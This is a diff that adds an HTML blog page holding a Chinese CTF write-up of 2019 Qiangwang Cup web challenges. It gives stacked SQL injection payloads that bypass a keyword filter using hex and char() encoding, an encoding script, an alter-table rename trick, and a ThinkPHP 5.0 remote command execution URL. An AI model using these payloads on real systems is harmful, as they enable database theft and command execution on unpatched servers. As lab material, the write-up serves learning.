@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="description" content="">
+    <meta name="author" content="chuddy">
+    <meta name="keywords" content="">
+    <title>2019强网杯线上部分web writeup ~ chuddy&#39;s Blog</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.2/css/all.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/mdb.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_vr10bjtg3us.css">
+    
+        <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+    
+</head>
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+<div class="container">
+    <a class="navbar-brand" href="/"><strong>chuddy&#39;s Blog</strong></a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav ml-auto text-center">
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/">Home</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/archives/">Archives</a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+
+</nav>
+    <div class="view intro-2" style='background: url("/post.jpg")no-repeat center center;background-size: cover;'>
+    <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+        <div class="container text-center white-text wow fadeInUp">
+            <p class="h2">2019强网杯线上部分web writeup</p>
+            <br>
+            
+            <p>Thursday, June 6th 2019, 3:25 pm</p>
+            
+        </div>
+        </div>
+    </div>
+    </div>
+  </header>
+
+  <main>
+  
+  <div class="container-fluid">
+    <div class="row">
+        <div class="col-md-8 offset-md-2 ">
+            <div class="post-content py-5 z-depth-3 main">
+                <h1 id="2019强网杯线上部分web-writeup"><a href="#2019强网杯线上部分web-writeup" class="headerlink" title="2019强网杯线上部分web  writeup"></a>2019强网杯线上部分web  writeup</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>强网杯已经已经结束了好久了，都没有好好的总结一下，</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><p>听名字就是一道注入的题目：<br><a href="http://web16.buuoj.cn/?inject=1" target="_blank" rel="noopener">题目链接</a></p>
+<p>打开之后是一个,搜索框</p>
+<p><img src="https://s2.ax1x.com/2019/06/06/VdSQ6H.png" alt="image"></p>
+<p>提交1发现会输出一个对应的值，<br>尝试一下<code>1&#39;</code>发现会得到报错，尝试一下万能密码<code>1&#39; or &#39;1&#39;=&#39;1</code>，发现能够把当前表所有的值全部输出出来，发现没有<code>flag</code>的值，意识到flag不再当前查询的表中，应该是在其他的表里面存着的。</p>
+<p>尝试注入时，发现存在过滤：</p>
+<pre><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;, $inject);
+</code></pre><p>发现过滤了<code>select</code>,<code>.</code>,<code>where</code>等，这就很难进行正常的注入了，需要另想办法。</p>
+<p>尝试过报错注入，虽然能够得到数据库信息，但是过滤了<code>select</code>就很难进行进一步的注入。</p>
+<p>通过多次的尝试，发现可以进行堆叠注入。</p>
+<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>通过堆叠注入，可以将sql注入的语句转换为16进制表示也可以bypass</p>
+<pre><code>1&#39;;set @t=0x73656c65637420312c323b;prepare x from @t;execute x;
+</code></pre><p> 但是尝试的时候发现过滤回显</p>
+<pre><code> strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)
+</code></pre><p> 这是个<code>strstr</code>函数呀！可以用大小写绕过！</p>
+<p>将查询的字符串转换为16进制 </p>
+<pre><code>payload = &quot;chuddy&#39;;set @s=%s;PREPARE a FROM @s;EXECUTE a;&quot;
+exp = &#39;select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()&#39;
+# exp = &quot;select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=&#39;1919810931114514&#39;&quot;
+# exp = &quot;select flag from `1919810931114514`&quot;
+
+my_payload = payload%(&quot;0x&quot;+exp.encode(&#39;hex&#39;))
+print my_payload
+</code></pre><p>payload为:</p>
+<p>注表名：</p>
+<pre><code>chuddy&#39;;set @s=0x73656c6563742067726f75705f636f6e636174285441424c455f4e414d45292066726f6d20696e666f726d6174696f6e5f736368656d612e5441424c4553207768657265205441424c455f534348454d413d64617461626173652829;PREPARE a FROM @s;EXECUTE a;
+</code></pre><p><img src="https://s2.ax1x.com/2019/06/07/Vwh8uF.png" alt="image"></p>
+<p>然后进行注列名</p>
+<pre><code>chuddy&#39;;set @s=0x73656c6563742067726f75705f636f6e63617428434f4c554d4e5f4e414d45292066726f6d20696e666f726d6174696f6e5f736368656d612e434f4c554d4e53207768657265205441424c455f4e414d453d273139313938313039333131313435313427;PREPARE a FROM @s;EXECUTE a;
+</code></pre><p><img src="https://s2.ax1x.com/2019/06/07/Vw4CVJ.png" alt="image"></p>
+<p>得到flag</p>
+<pre><code>chuddy&#39;;set @s=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;PREPARE a FROM @s;EXECUTE a;
+</code></pre><p><img src="https://s2.ax1x.com/2019/06/07/Vw4kP1.png" alt="image"></p>
+<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>通过堆叠注入，尝试用char()进行绕过。<br> 通过对sql注入的语句，转换成为单个的ascii码，然后通过char()函数进行转换以及利用concat()函数进行重新拼接，来bypass。</p>
+<p> 可以参考飘零师傅的博客。</p>
+<p> 进行编码的脚本：</p>
+<pre><code> payload = &quot;0&#39;;set @s=concat(%s);PREPARE a FROM @s;EXECUTE a;&quot;
+exp = &#39;select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()&#39;
+# exp = &quot;select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=&#39;1919810931114514&#39;&quot;
+# exp = &quot;select flag from `1919810931114514`&quot;
+res = &#39;&#39;
+for i in exp:
+    res += &quot;char(%s),&quot;%(ord(i))
+my_payload = payload%(res[:-1])
+print my_payload
+</code></pre><p> getflag</p>
+<pre><code> 0&#39;;set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(102),char(108),char(97),char(103),char(32),char(102),char(114),char(111),char(109),char(32),char(96),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52),char(96));PREPARE a FROM @s;EXECUTE a;
+</code></pre><h4 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h4><p>过滤的内容为：</p>
+<pre><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;, $inject);
+</code></pre><p>发现这里面没有过滤一些<code>show</code>,<code>alter</code>等一些字段，我们可以通过修改表名，和表的字段名，来进行换表，得到flag。</p>
+<p>首先通过报错注入查看库名：</p>
+<pre><code>1&#39;and extractvalue(1, concat(0x7e, (database()),0x7e))
+</code></pre><p>库名为：<code>supersqli</code></p>
+<p>查表名</p>
+<pre><code>chuddy&#39;; show tables;
+
+
+
+返回结果为：
+array(1) {
+  [0]=&gt;
+  string(16) &quot;1919810931114514&quot;
+}
+
+array(1) {
+  [0]=&gt;
+  string(5) &quot;words&quot;
+}
+</code></pre><p>查表结构：</p>
+<pre><code>1&#39;;show create table words;show create table `1919810931114514`;
+</code></pre><p>表结构为：</p>
+<pre><code>array(2) {
+  [0]=&gt;
+  string(5) &quot;words&quot;
+  [1]=&gt;
+  string(114) &quot;CREATE TABLE `words` (
+  `id` int(10) NOT NULL,
+  `data` varchar(20) NOT NULL
+) ENGINE=MyISAM DEFAULT CHARSET=utf8&quot;
+}
+
+array(2) {
+  [0]=&gt;
+  string(16) &quot;1919810931114514&quot;
+  [1]=&gt;
+  string(101) &quot;CREATE TABLE `1919810931114514` (
+  `flag` varchar(100) NOT NULL
+) ENGINE=MyISAM DEFAULT CHARSET=utf8&quot;
+}
+</code></pre><p>我们可以将words表改名为aaa,将flag所在的表改名为word。</p>
+<p>注意，word表的查询时查的id，我们还需要给flag添加一个字段名。来保证查询语句中的id可以查询。</p>
+<p>最终payload为：</p>
+<pre><code>1&#39;;alter table `1919810931114514` add(id int default 1);alter table words rename aaa;alter table `1919810931114514` rename words;#
+</code></pre><p>然后查询1就可以得到flag了。</p>
+<h3 id="强网先锋-上单"><a href="#强网先锋-上单" class="headerlink" title="强网先锋-上单"></a>强网先锋-上单</h3><p>打开可以发现列目录。点击进去发现像是ThinkPHP.</p>
+<p>打开Readme.</p>
+<p><img src="https://s2.ax1x.com/2019/06/07/VwbkwT.png" alt="image"></p>
+<p>发现ThinkPHP 5.0。随手百度一下框架漏洞，发现存在命令执行，直接上payload</p>
+<pre><code>/1/public/index?s=index/think%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag
+</code></pre><p>就能得到flag。</p>
+
+                <hr>
+                <div>
+                    <p>
+                         
+                        <span class="badge badge-light">#&nbsp;writeup</span>
+                        &nbsp;
+                        
+                    </p>
+                </div>
+                <br>
+                
+            </div>
+        </div>
+        <div class="d-none d-md-block col-md-2">
+            
+  <div id="toc" class="py-5">
+    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
+    <div id="tocbot"></div>
+  </div>
+
+        </div>
+    </div>        
+</div>
+
+<br><br><br>
+
+<!-- Comments -->
+<div class="comments" id="comments">
+ 
+</div>
+  
+  </main>
+
+<footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank"><b>HEXO</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+  </div>
+</footer>
+
+  <!-- SCRIPTS -->
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/jquery-3.3.1.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/popper.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/bootstrap.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/mdb.min.js"></script>
+  <script src="/js/main.js"></script>
+  
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    
+    <script src="/js/post.js"></script>
+    
+      <script src="/js/plugins/prettify.js"></script>
+      <script>
+          $(document).ready(function(){
+              $('pre').addClass('prettyprint linenums');
+              prettyPrint();
+          })
+      </script>
+    
+  
+</body>
+</html>
